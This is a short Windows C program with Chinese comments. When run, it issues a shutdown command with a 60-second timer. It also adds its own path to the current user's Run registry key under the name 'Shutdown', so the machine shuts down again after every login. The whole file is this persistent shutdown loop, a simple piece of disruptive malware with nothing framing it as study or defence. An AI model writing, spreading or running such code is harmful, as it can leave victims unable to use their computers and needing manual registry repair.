/*
 * @Descripttion: 
 * @version: 
 * @Date: 2019-09-24 09:57:42
 * @LastEditTime: 2019-09-24 10:06:38
 */
#include<stdio.h>
#include <windows.h>
int main()
{
    char *Register = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    DWORD dwDisposition;
    char FilePath[2048];
    GetModuleFileName(NULL,FilePath,2048); 
    system("shutdown -s -t 60");
    //打开注册表启动项 
    if(RegOpenKeyExA(HKEY_CURRENT_USER, Register, 0, KEY_ALL_ACCESS, &hKey)== ERROR_SUCCESS)
    {
      
        RegSetValueEx(hKey, "Shutdown", 0, REG_SZ, (BYTE *)FilePath, strlen(FilePath));
        //关闭注册表
        RegCloseKey(hKey);
        //printf("succeed!\n");
    }
    else
    {
        printf("Failed!");
        return -1;
    }
    return 0;
}